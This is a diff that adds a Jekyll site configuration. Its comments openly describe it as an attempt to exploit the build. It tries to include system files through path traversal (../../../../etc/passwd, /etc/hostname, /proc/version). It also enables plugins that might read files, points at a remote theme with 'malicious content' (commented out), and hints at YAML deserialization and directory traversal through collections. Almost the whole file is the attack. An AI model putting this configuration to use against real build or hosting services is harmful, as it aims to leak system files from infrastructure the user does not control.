@@ -1,0 +1,34 @@
+title: Kramdown Test
+markdown: kramdown
+kramdown:
+  input: GFM
+  hard_wrap: false
+  parse_block_html: true
+  parse_span_html: true
+  html_to_native: false
+  syntax_highlighter: rouge
+  entity_output: as_input
+  toc_levels: "1..6"
+  smart_quotes: lsquo,rsquo,ldquo,rdquo
+  enable_coderay: false
+  
+# Try loading a remote theme that has malicious content
+# remote_theme: pages-themes/minimal
+
+# Try plugins that might read files
+plugins:
+  - jekyll-remote-theme
+  - jekyll-seo-tag
+  - jekyll-readme-index
+
+# Include directive - try to include /etc/passwd
+include:
+  - ../../../../etc/passwd
+  - /etc/hostname
+  - /proc/version
+
+# Data directory with YAML deserialization
+data_dir: _data
+
+# Collections that might traverse
+collections_dir: .
